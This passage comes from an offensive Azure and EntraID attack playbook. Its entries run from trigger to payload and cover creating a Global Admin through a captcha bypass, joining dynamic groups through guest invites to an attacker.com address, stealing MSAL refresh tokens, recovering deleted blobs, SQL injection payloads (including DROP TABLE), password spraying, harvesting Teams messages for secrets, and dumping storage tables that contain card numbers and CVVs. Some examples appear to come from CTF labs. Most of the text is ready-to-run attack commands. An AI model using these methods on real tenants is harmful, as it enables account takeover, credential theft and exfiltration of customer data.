- **Yields:** Global Administrator account created in victim's EntraID tenant — use for admin consent, RBAC escalation, or further Graph API operations
- **Opsec:** High
- **Context:** Web apps implementing captcha often validate a server-side parameter rather than independently verifying the captcha token. Sending `skipRecaptcha=true` (or similar flag) in the POST body bypasses the validation. When the endpoint creates EntraID user accounts without tenant isolation, any valid SP/token can create admins in the victim tenant. Immediately useful for granting OAuth admin consent.
- **Payload/Method:**
  ```bash
  # Probe the endpoint — try both authenticated and unauthenticated
  # Check for parameters like skipRecaptcha, bypass_captcha, debug, internal
  curl -X POST "$WEB_APP_ENDPOINT/create-user" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'firstName=Admin&lastName=User&password=Str0ng@Pass!&skipRecaptcha=true'

  # Variation: JSON body
  curl -X POST "$WEB_APP_ENDPOINT/create-user" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"firstName":"Admin","lastName":"User","password":"Str0ng@Pass!","skipRecaptcha":true}'

  # Confirm account created in EntraID
  az ad user list --filter "startswith(displayName,'Admin')" --query "[].{UPN:userPrincipalName,Role:assignedRoles}"
  ```

### Azure Dynamic Group Membership Manipulation via User.Invite.All [added: 2026-05]
- **Tags:** #Azure #EntraID #DynamicGroup #GuestInvite #UserInviteAll #GroupMembership #GraphAPI #PrivEsc
- **Trigger:** Graph API token has `User.Invite.All` permission + `Group.Read.All` reveals groups with dynamic membership rules based on email prefix or display name
- **Prereq:** Graph API access token with `User.Invite.All` + `Group.Read.All` + target group uses a predictable dynamic membership rule (e.g., `email startsWith 'ctf'` or `displayName startsWith 'CTF'`)
- **Yields:** Guest user that auto-joins target group; inherits all app role assignments and resource access assigned to the group (storage blobs, enterprise apps, etc.)
- **Opsec:** Low
- **Context:** Azure AD dynamic groups auto-populate based on user attribute rules. If the rule is predictable (email prefix, display name prefix), an attacker with `User.Invite.All` can invite a guest whose email matches the rule. The guest auto-joins the group, inheriting all app role assignments. Then authenticate as the guest to discover and access group-assigned applications and storage.
- **Payload/Method:**
  ```bash
  # Step 1 — Enumerate groups and find dynamic membership rules
  curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://graph.microsoft.com/v1.0/groups?\$select=displayName,membershipRule,membershipRuleProcessingState" \
    | jq '.value[] | select(.membershipRule != null) | {name:.displayName, rule:.membershipRule}'

  # Example rule: (user.mail -startsWith "ctf") and (user.displayName -startsWith "CTF")

  # Step 2 — Craft invitation matching the rule
  curl -s -X POST "https://graph.microsoft.com/v1.0/invitations" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "invitedUserEmailAddress": "ctf1337@attacker.com",
      "inviteRedirectUrl": "https://portal.azure.com",
      "displayName": "CTF1337"
    }' | jq '{inviteRedeemUrl: .inviteRedeemUrl, userId: .invitedUser.id}'

  # Step 3 — Redeem the invitation (open inviteRedeemUrl in browser or automate)
  # Guest account is created; dynamic group rule runs within ~5 minutes

  # Step 4 — Authenticate as the guest and enumerate app role assignments
  az login --tenant <VICTIM_TENANT> --use-device-code
  ACCESS_TOKEN=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv)
  curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://graph.microsoft.com/v1.0/me/appRoleAssignments" | jq '.value[] | {resourceId, resourceDisplayName}'
  ```

### Azure Service Principal Notes / Metadata URL Extraction via Graph API [added: 2026-05]
- **Tags:** #Azure #EntraID #ServicePrincipal #GraphAPI #MetadataLeak #BlobURL #AppRegistration #InfoDisclosure
- **Trigger:** Have a `resourceId` from `/me/appRoleAssignments` — pivot to service principal details to look for hardcoded URLs, notes, or metadata pointing to sensitive storage resources
- **Prereq:** Graph API token + `resourceId` of a service principal (from appRoleAssignments or group enumeration) + SP object contains URL or sensitive path in its `notes`, `homepage`, or custom properties
- **Yields:** Direct URL to sensitive blob storage, API endpoints, or other sensitive resources embedded in the SP definition
- **Opsec:** Low
- **Context:** Service principal objects in EntraID can contain arbitrary metadata in fields like `notes`, `homepage`, `replyUrls`, and `servicePrincipalNames`. Developers sometimes store operational URLs (blob storage paths, internal endpoints, API keys) in these fields. After gaining group membership and discovering app role assignments, pivot to the SP object to extract any embedded resource pointers.
- **Payload/Method:**
  ```bash
  # Get all fields from the service principal object
  curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://graph.microsoft.com/v1.0/servicePrincipals/<RESOURCE_ID>" | jq .

  # Target fields that commonly contain URLs
  curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://graph.microsoft.com/v1.0/servicePrincipals/<RESOURCE_ID>" \
    | jq '{notes, homepage, replyUrls, servicePrincipalNames, info}'

  # If URL found (e.g., blob storage path), download using authenticated az CLI
  # Format: https://<STORAGEACCOUNT>.blob.core.windows.net/<CONTAINER>/<FILE>
  az storage blob download \
    --account-name <STORAGEACCOUNT> \
    --container-name <CONTAINER> \
    --name <FILENAME> \
    --file ./output.txt \
    --auth-mode login
  ```

### Azure Refresh Token Extraction & Long-Lived Access [added: 2026-05]
- **Tags:** #Azure #RefreshToken #TokenPersistence #MSAL #CredentialHarvest #LongLivedAccess #ManagedIdentity
- **Trigger:** Compromised Azure VM or app service instance with user logged into Azure CLI or Portal
- **Prereq:** Access to `.azure/msal_token_cache.json` on compromised system; knowledge of cached user identity
- **Yields:** Refresh token with ~90-day default lifetime; ability to obtain new access tokens without re-authentication
- **Opsec:** Low (file is local; no network-based detection)
- **Context:** Azure stores refresh tokens in `~/.azure/msal_token_cache.json` (encrypted with DPAPI on Windows, plaintext on Linux). Refresh tokens have 90-day lifetimes and can generate new access/refresh token pairs indefinitely. Enables sustained access even after initial credentials expire or are rotated.
- **Payload/Method:**
  ```bash
  # Extract MSAL token cache from compromised system
  cat ~/.azure/msal_token_cache.json
  
  # Exfiltrate and parse locally to extract refresh tokens
  grep -o '"refresh_token":"[^"]*"' msal_token_cache.json
  
  # Convert refresh token to Azure Management token using TokenTacticsV2
  Invoke-RefreshToAzureManagementToken -RefreshToken "<refresh_token>"
  
  # Convert refresh token to Azure Storage token
  Invoke-RefreshToAzureStorageToken -RefreshToken "<refresh_token>"
  
  # Convert refresh token to MS Graph token
  Invoke-RefreshToMSGraphToken -RefreshToken "<refresh_token>"
  ```
- **Tool:** TokenTacticsV2 (https://github.com/rvrsh3ll/TokenTactics) — PowerShell module for Azure token conversion and abuse

### Azure Storage Blob Recently Deleted Versions Enumeration [added: 2026-05]
- **Tags:** #Azure #StorageAccount #BlobVersioning #DeletedBlobs #DataRecovery #SecretDiscovery
- **Trigger:** Authenticated access to Azure Storage Account with Blob Data Reader or higher role; versioning enabled on storage
- **Prereq:** Azure Storage Account permissions (Storage Blob Data Contributor or Reader); Storage Browser GUI or REST API access; deleted blobs exist (soft-deleted within retention period)
- **Yields:** Recently deleted blob versions containing plaintext credentials, data exports, logs, and configuration files
- **Opsec:** Low (versioning/deletion audit is logged in Azure Monitor, but reading is routine)
- **Context:** Azure Storage accounts support soft-delete (default 7-30 day retention). The Azure Portal Storage Browser shows only active blobs by default, but toggling "Show deleted blobs" option reveals deleted versions. Deleted data exports often contain plaintext usernames, hashes, connection strings, and API keys.
- **Payload/Method:**
  ```bash
  # Via Azure Portal:
  # 1. Navigate to Storage Account > Containers
  # 2. Select container
  # 3. Click "Show deleted blobs" toggle
  # 4. Download any visible deleted blob versions (e.g., user_export_20240202.csv)
  
  # Via Azure CLI:
  az storage blob list \
    --container-name <container-name> \
    --account-name <account-name> \
    --include d  # Include deleted blobs
  
  # Via REST API to download specific deleted blob version:
  curl -X GET \
    "https://<storage-account>.blob.core.windows.net/<container>/<blob-name>?versionId=<version-id>" \
    -H "Authorization: Bearer <token>"
  ```
- **Note:** Soft-delete retention period varies by storage account; check deletion retention days in storage account settings.

### Azure Function HTTP Trigger SQL Injection [added: 2026-05]
- **Tags:** #Azure #SQLInjection #Function #HTTPTrigger #InputValidation #DatabaseExfil #Bypass
- **Trigger:** HTTP-triggered Azure Function accepts user input and passes it unsanitized to SQL queries; application filters single parameters but misses UNION injection vectors
- **Prereq:** Identified HTTP trigger endpoint; understanding of application logic (e.g., table names, column counts); ability to craft SQL UNION payloads
- **Yields:** Full database schema enumeration and arbitrary data exfiltration (credentials, app data, secrets)
- **Opsec:** Med (SQL injection attempts may be logged by Azure SQL; depends on threat detection config)
- **Context:** Azure Functions with HTTP triggers may accept JSON input and execute parameterized or unsanitized SQL queries. Single-column filters (e.g., whitelist on table name) can be bypassed using UNION-based injection on unfiltered columns. Attacker can extract schema and dump credentials from application tables.
- **Payload/Method:**
  ```powershell
  # Reconnaissance: Determine column count and data type
  ' UNION SELECT 1, 2, 3, 4, 5, 6 --
  
  # Extract SQL Server version
  ' UNION SELECT 1, @@version, null, null, 5, 6 --
  
  # Enumerate tables in database
  ' UNION SELECT 1, table_name, null, null, 5, 6 FROM information_schema.tables --
  
  # Enumerate columns in specific table
  ' UNION SELECT 1, column_name, data_type, null, 5, 6 FROM information_schema.columns WHERE table_name='appusers' --
  
  # Extract credentials from application table
  ' UNION SELECT null, id, null, null, username, password FROM appusers --
  
  # Bypass simple table-name filter by injecting via comment:
  # Input: {"tableName": "users'; DROP TABLE users; --"}
  # Execution: SELECT * FROM users'; DROP TABLE users; -- (depends on filter logic)
  
  # Advanced: Extract data using nested UNION for multi-column extraction
  ' UNION SELECT id, username, password, email, role, null FROM appusers WHERE id > 0 --
  ```
- **Testing:** Use Burp Suite Intruder or manual HTTP POST requests with JSON payload to target Azure Function endpoint.

### Azure Credential Spray via Entra ID User Enumeration [added: 2026-05]
- **Tags:** #Azure #EntraID #CredentialSpray #MSOLSpray #MFABypass #BruteForce #UserEnum
- **Trigger:** Extracted Entra ID user list (via GraphRunner or public domain enumeration); no MFA detected on target accounts
- **Prereq:** Entra ID user list (email or UPN format); password dictionary or leaked credentials; tools: MSOLSpray (or o365userfinder); optional MFASweep to confirm MFA absence
- **Yields:** Valid Entra ID credentials for compromised accounts; access to Azure services (portal, Exchange, Teams, SharePoint, etc.)
- **Opsec:** High (spray attempts are logged and may trigger account lockout; conditional access policies block suspicious logins)
- **Context:** MSOLSpray performs distributed credential spray against Entra ID endpoints. When MFA is absent (confirmed via MFASweep), spray attacks succeed even without 2FA handling. Accounts with conditional access disabled are particularly vulnerable.
- **Payload/Method:**
  ```powershell
  # Enumerate Entra ID users via GraphRunner
  Invoke-GraphRunner -NoRefresh
  
  # Confirm absence of MFA via MFASweep
  Invoke-MFASweep -OutputFile "mfa_status.txt"
  
  # Run credential spray using MSOLSpray
  Invoke-MSOLSpray -UserList users.txt -Password 'Password123!' -Delay 300
  
  # Alternative: Manual spray via Azure CLI
  for user in $(cat users.txt); do
    az login --username "$user" --password 'Guessed_Password' 2>/dev/null && echo "[+] $user:Guessed_Password" >> valid_creds.txt
  done
  ```
- **Note:** Azure enforces progressive delays and account lockouts; Entra ID conditional access policies may block based on location, device compliance, or risk detection.

### Teams Message Extraction via Graph API [added: 2026-05]
- **Tags:** #Azure #TeamsDataExfil #GraphAPI #DataExfil #AADInternals #MSGraphToken #CredentialTheft #ChatLogs
- **Trigger:** Compromised Azure user credential + need to extract sensitive data from Teams messages or discover hidden credentials (passwords in chat history)
- **Prereq:** Compromised user credentials + Graph API `Chat.Read.All` or delegated permissions + AADInternals PowerShell module or direct Graph API access
- **Yields:** Plaintext chat messages from Teams channels/DMs, potentially including credentials, secrets, or sensitive business logic discussed in Teams
- **Opsec:** High — Teams audit logs may trigger alerts on bulk message export
- **Context:** AADInternals provides convenience functions to extract Teams messages. First obtain a delegated token (user refresh token or direct login), then extract chat history. Messages are often stored in plaintext and may contain passwords, API keys, or sensitive discussions. Extracted credential material can enable lateral movement or privilege escalation.
- **Payload/Method:**
  ```powershell
  # Step 1: Obtain MS Graph token via compromised credentials (AADInternals)
  $username = "user@target.com"
  $password = "Compromised_Password"
  Import-Module AADInternals
  
  # Get delegated Graph token
  $graphToken = Get-AADIntAccessTokenForMSGraph -Credentials (New-Object pscredential $username,(ConvertTo-SecureString $password -AsPlainText -Force))
  
  # Step 2: Extract Teams messages
  # Uses cached token from previous step
  $messages = Get-AADIntTeamsMessages -SaveToCache
  
  # Output format: array of message objects with sender, timestamp, content
  $messages | Format-Table -AutoSize
  
  # Step 3: Parse and extract credentials (grep for common patterns)
  $messages | Select-Object -Property Content | Where-Object {$_.Content -match 'password|secret|key|token|api_key'} | Out-File ./extracted_secrets.txt
  
  # Step 4: (Alternative) Direct Graph API call without AADInternals
  # First, get access token
  $tokenResponse = Invoke-RestMethod -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" `
    -Body @{
      grant_type = "password"
      client_id = "d3590ed6-52b3-4102-aedd-a47eb6b5b5cb"  # Microsoft Graph PowerShell app ID
      username = "$username"
      password = "$password"
      scope = "https://graph.microsoft.com/.default"
    }
  
  $graphToken = $tokenResponse.access_token
  
  # List chats (conversations)
  $chats = Invoke-RestMethod -Method Get `
    -Uri "https://graph.microsoft.com/v1.0/me/chats" `
    -Headers @{Authorization = "Bearer $graphToken"}
  
  # Extract messages from each chat
  foreach ($chat in $chats.value) {
    $messages = Invoke-RestMethod -Method Get `
      -Uri "https://graph.microsoft.com/v1.0/me/chats/$($chat.id)/messages" `
      -Headers @{Authorization = "Bearer $graphToken"}
    
    foreach ($msg in $messages.value) {
      Write-Host "$($msg.createdDateTime) | $($msg.from.user.displayName): $($msg.body.content)"
    }
  }
  ```

### Azure AD Group Membership to Storage Table Access [added: 2026-05]
- **Tags:** #Azure #ADGroup #StorageTable #LateralMovement #DataExfiltration #RBAC #TableStorage #az-cli
- **Trigger:** Compromised Azure identity appears in a sensitive AD group (e.g., `CUSTOMER-DATABASE-ACCESS`), `az ad user get-member-groups` returns group IDs, and `az role assignment list` shows the group has a custom RBAC role tied to table storage (e.g., `Microsoft.Storage/storageAccounts/tableServices/tables/read` action)
- **Prereq:** Compromised Azure credentials (`az login`); membership in an AD group with a custom or built-in role that grants `Microsoft.Storage/storageAccounts/tableServices/tables/entities/read` dataAction
- **Yields:** Direct read access to all table entities in the target storage account(s); confidential data (customer records, config, secrets) exfiltrated as plaintext
- **Opsec:** Med — all table queries are logged in Storage Analytics and Azure Monitor if enabled; no secrets involved but volume of queries may alert
- **Context:** Azure tables store semi-structured data (customer records, config, logs) and are frequently overlooked in RBAC reviews. A user in an AD group with a "read tables" role inherits that permission automatically. Unlike Blob Storage or Key Vault, table access via `az storage entity query` leaves minimal forensic footprint unless audit logging is explicitly enabled. Escalation chain: compromised user → group membership → custom role → storage read.
- **Payload/Method:**
  ```bash
  # Step 1: Authenticate as compromised user
  az login -u marcus@megabigtech.com -p 'TheEagles12345!'
  
  # Step 2: Enumerate AD groups for compromised user
  USERID=$(az ad user list --query "[?userPrincipalName=='marcus@megabigtech.com'].id" -o tsv)
  az ad user get-member-groups --id "$USERID" | jq '.[] | select(.displayName | test("DATABASE|ACCESS|DATA"))'
  # Look for groups tied to sensitive resources
  
  # Step 3: Check role assignments for the user (both direct and inherited via group)
  az role assignment list --all --query "[?principalName=='marcus@megabigtech.com' || principalName=='CUSTOMER-DATABASE-ACCESS']" | jq '[.[] | {roleDefinitionName, scope}]'
  
  # Step 4: Identify storage accounts visible to user
  az storage account list | jq -r '.[].name'
  
  # Step 5: List tables in each storage account
  for storage in custdatabase mbtwebsite securityconfigs; do
    echo "[*] Tables in $storage:"
    az storage table list --account-name "$storage" --output table --auth-mode login
  done
  
  # Step 6: Query all entities from target table (exfiltrate data)
  az storage entity query \
    --table-name customers \
    --account-name custdatabase \
    --output table \
    --auth-mode login | tee customer_data_dump.txt
  
  # Step 7: (Alternative) Export as JSON for downstream processing
  az storage entity query \
    --table-name customers \
    --account-name custdatabase \
    --output json \
    --auth-mode login > customer_data.json
  ```

### Azure Custom Role Capability Inference via Role Definition Query [added: 2026-05]
- **Tags:** #Azure #CustomRole #RBAC #Enumeration #RoleDefinition #PrivEsc #DataActions #az-cli
- **Trigger:** `az role assignment list --all` returns roles with names that are not standard Microsoft roles (e.g., `Customer Database Access`, `Contractor Access`); role name suggests it controls access to a sensitive resource
- **Prereq:** Authenticated `az` CLI session with `Reader` or higher RBAC; ability to run `az role definition list --custom-role-only true`
- **Yields:** Full capability breakdown of custom role (actions, dataActions, notActions); hidden escalation paths (e.g., `*/read` permissions on resources like databases, key vaults, or secrets)
- **Opsec:** Low — role definition queries are part of normal Azure enumeration and generate no alerts
- **Context:** Organizations often define custom roles to implement least-privilege access (e.g., "Database Read Only" or "Container Registry Deployer"). However, custom roles are frequently misconfigured and may grant broader permissions than intended. Querying a custom role's definition exposes its full capability surface before attempting to use it. Even a role named "Contractor Access" with only `read` permission on table storage may have been assigned inappropriately to sensitive groups.
- **Payload/Method:**
  ```bash
  # Step 1: Fetch all custom roles in the subscription
  az role definition list --custom-role-only true --output json > custom_roles.json
  
  # Step 2: Parse role definitions to find target role
  # Example: find "Customer Database Access" role
  az role definition list --custom-role-only true --query "[?roleName=='Customer Database Access']" | jq '.[0].permissions'
  
  # Output should show:
  # [
  #   {
  #     "actions": [
  #       "Microsoft.Storage/storageAccounts/tableServices/tables/read"
  #     ],
  #     "condition": null,
  #     "conditionVersion": null,
  #     "dataActions": [
  #       "Microsoft.Storage/storageAccounts/tableServices/tables/entities/read"
  #     ],
  #     "notActions": [],
  #     "notDataActions": []
  #   }
  # ]
  
  # Step 3: Cross-reference role with user assignments
  # Check if any user or group has this custom role assigned
  az role assignment list --all --query "[?roleDefinitionName=='Customer Database Access']" | jq '.[].principalName'
  
  # Step 4: Identify scope (subscription, resource group, or specific resource)
  az role assignment list --all --query "[?roleDefinitionName=='Customer Database Access']" | jq '.[].scope'
  
  # Step 5: Attempt to use the role permissions (if you have inherited this role via group membership)
  # Example: if you're in the group with "Customer Database Access" role
  az storage account list --query "[].name" -o tsv | while read acct; do
    az storage table list --account-name "$acct" --output table --auth-mode login && break
  done
  ```

### Azure Storage Table Entity Query via Custom Role [added: 2026-05]
- **Tags:** #Azure #TableStorage #DataExfiltration #StorageAccount #az-cli #RBAC #CustomRole #NoSQL
- **Trigger:** Compromised identity has `Microsoft.Storage/storageAccounts/tableServices/tables/entities/read` dataAction on a storage account; `az storage table list` returns table names; target table contains customer data, configuration, or secrets
- **Prereq:** Authenticated `az` CLI with Storage Blob Data Reader or custom role granting table entity read; knowledge of storage account name and table name
- **Yields:** All rows (entities) from target table exported as plaintext (CSV, JSON, or table format); includes all columns (PartitionKey, RowKey, and all custom properties like Card_number, Card_expiry, CVV, etc.)
- **Opsec:** Med-High — query volume is logged in Azure Monitor; Table Storage does not enforce field-level encryption by default, so all data is readable if entity-read is granted
- **Context:** Azure Table Storage is a NoSQL key-value store often used to store semi-structured operational data (customer records, audit logs, configuration). Unlike SQL databases, tables do not support column-level permissions or row-level security (RLS) natively — once you can read the table, you can read ALL rows and ALL columns. Data is stored unencrypted unless the application implements client-side encryption.
- **Payload/Method:**
  ```bash
  # Prerequisites: authenticated az CLI with table read permissions
  # Syntax: az storage entity query --table-name <TABLE> --account-name <ACCT> --output {table|json|tsv|csv}
  
  # Step 1: List all tables in the storage account
  az storage table list --account-name custdatabase --output table --auth-mode login
  # Output:
  # Name
  # ---------
  # customers
  
  # Step 2: Query all entities from a table (exfiltrate full table)
  az storage entity query \
    --table-name customers \
    --account-name custdatabase \
    --output table \
    --auth-mode login
  
  # Output (all columns visible):
  # PartitionKey  RowKey  Card_expiry  Card_number       Customer_id                           Customer_name           CVV
  # 1             1       10/30        5425233430109903  07244ad0-c228-43d8-a48e-1846796aa6ad  SecureBank Holdings     543
  # 1             2       09/29        4012000033330026  66d7a744-5eb6-4b1b-9e70-a36824366534  NeuraHealth             452
  # 1             99                                                                           Flag: db04bf0ed...
  
  # Step 3: Export to JSON for programmatic access
  az storage entity query \
    --table-name customers \
    --account-name custdatabase \
    --output json \
    --auth-mode login > exfil_customers.json
  
  # Step 4: Export with jq filtering (e.g., extract only payment data)
  az storage entity query \
    --table-name customers \
    --account-name custdatabase \
    --output json \
    --auth-mode login | jq '.[] | {customer: .Customer_name, card: .Card_number, expiry: .Card_expiry, cvv: .Cvv}'
  
  # Step 5: Iterate over multiple tables
  for table in customers payments subscriptions; do
    echo "[*] Exfiltrating $table..."
    az storage entity query \
      --table-name "$table" \
      --account-name custdatabase \
      --output json \
      --auth-mode login > "exfil_${table}.json"
  done
  ```
